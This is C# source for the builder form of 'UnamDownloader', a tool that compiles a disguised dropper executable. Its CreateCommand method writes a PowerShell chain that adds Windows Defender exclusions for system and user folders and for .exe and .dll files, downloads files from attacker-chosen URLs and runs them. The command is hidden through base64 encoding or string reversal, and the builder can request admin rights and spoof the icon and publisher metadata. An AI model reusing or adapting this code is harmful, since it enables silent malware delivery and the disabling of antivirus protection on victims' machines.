using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace UnamDownloader
{
    public partial class Builder : Form
    {
        private static Random random = new Random();
        public Vanity vanity = new Vanity();

        public Builder()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            radioNative.Checked = true;
        }

        public void ManagedCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v4.0");
            CompilerParameters parameters = new CompilerParameters();
            string compilerOptions = " /target:winexe /platform:AnyCPU /optimize+ ";

            StringBuilder loaderbuilder = new StringBuilder(Properties.Resources.Program);

            if (checkAdmin.Checked)
            {
                System.IO.File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
                compilerOptions += " /win32manifest:\"" + savePath + ".manifest" + "\"";
                loaderbuilder.Replace("DefAdmin", "true");
            }

            if (vanity.checkIcon.Checked && vanity.txtIconPath.Text.Trim().Length > 0)
            {
                compilerOptions += " /win32icon:\"" + vanity.txtIconPath.Text.Trim() + "\"";
            }

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = savePath;
            parameters.CompilerOptions = compilerOptions;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            loaderbuilder.Replace("#DATA", Convert.ToBase64String(Encoding.ASCII.GetBytes(CreateCommand())));
            loaderbuilder.Replace("DefDebug", "false");
            loaderbuilder.Replace("%Guid%", Guid.NewGuid().ToString());

            if (vanity.checkAssembly.Checked)
            {
                loaderbuilder.Replace("DefAssembly", "true");
                loaderbuilder.Replace("%Title%", vanity.txtAssemblyTitle.Text);
                loaderbuilder.Replace("%Description%", vanity.txtAssemblyDescription.Text);
                loaderbuilder.Replace("%Company%", vanity.txtAssemblyCompany.Text);
                loaderbuilder.Replace("%Product%", vanity.txtAssemblyProduct.Text);
                loaderbuilder.Replace("%Copyright%", vanity.txtAssemblyCopyright.Text);
                loaderbuilder.Replace("%Trademark%", vanity.txtAssemblyTrademark.Text);
                loaderbuilder.Replace("%v1%", vanity.txtAssemblyVersion1.Text);
                loaderbuilder.Replace("%v2%", vanity.txtAssemblyVersion2.Text);
                loaderbuilder.Replace("%v3%", vanity.txtAssemblyVersion3.Text);
                loaderbuilder.Replace("%v4%", vanity.txtAssemblyVersion4.Text);
            }

            var results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(parameters, loaderbuilder.ToString());
            if (results.Errors.HasErrors)
            {
                foreach(var error in results.Errors)
                {
                    MessageBox.Show(error.ToString(), "Error when building downloader!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            if (checkAdmin.Checked)
            {
                System.IO.File.Delete(savePath + ".manifest");
            }
        }

        public void NativeCompiler(string savePath)
        {
            string currentDirectory = Path.GetDirectoryName(savePath);
            string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";
            using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
            {
                archive.ExtractToDirectory(currentDirectory);
            }
            if (checkAdmin.Checked)
            {
                System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
            }
            StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
            sb.Replace("#COMMAND", ReverseString("cmd " + CreateCommand()));
            sb.Replace("#RANDOM", RandomString(12));

            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.Combine(currentDirectory, "tinycc\\tcc.exe"),
                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32 -m32",
                WorkingDirectory = currentDirectory,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            System.IO.File.Delete(Path.Combine(currentDirectory, "manifest.o"));
            System.IO.File.Delete(Path.Combine(currentDirectory, filename));
            Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
        }

        public string CreateCommand()
        {
            List<string> downloads = new List<string>();
            List<string> executes = new List<string>();

            int count = listFiles.Items.Count;
            for (int i = 0; i < count; i++)
            {
                File filevar = ((File)listFiles.Items[i]);
                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "%cd%" : "%" + filevar.comboDropLocation.Text + "%";
                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', '{1}')", filevar.txtDownloadURL.Text, Path.Combine(droplocation, filevar.txtFilename.Text)));
                if (filevar.toggleExecute.Checked)
                {
                    executes.Add(string.Format(@"powershell Start-Process -FilePath '{0}'", Path.Combine(droplocation, filevar.txtFilename.Text)));
                }
            }
            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @('%UserProfile%','%AppData%','%Temp%','%SystemRoot%','%HomeDrive%','%SystemDrive%') -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
        }

        public string RandomString(int length)
        {
            const string chars = "abcdefghijklmnpqrstuvwxyz";
            const int clength = 25;
            var buffer = new char[length];
            for (var i = 0; i < length; ++i)
            {
                buffer[i] = chars[random.Next(clength)];
            }
            return new string(buffer);
        }

        public string ReverseString(string text)
        {
            if (text == null) return null;
            char[] array = text.ToCharArray();
            Array.Reverse(array);
            return new string(array);
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = filter;
            dialog.InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            File add = new File();
            add.builder = this;
            add.Show();
            listFiles.Items.Add(add);
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Show();
            }
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Hide();
                listFiles.Items.Remove(listFiles.SelectedItem);
            }
        }

        private void linkGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/UnamDownloader");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (listFiles.Items.Count == 0)
            {
                MessageBox.Show("You need to add at least one file to download before building.", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            if (save.Length > 0)
            {
                if (radioNative.Checked)
                {
                    NativeCompiler(save);
                }
                else
                {
                    ManagedCompiler(save);
                }
            }
        }

        private void btnVanity_Click(object sender, EventArgs e)
        {
            vanity.Show();
        }

        private void radioNative_CheckedChanged(object sender)
        {
            btnVanity.Visible = !radioNative.Checked;
        }
    }
}
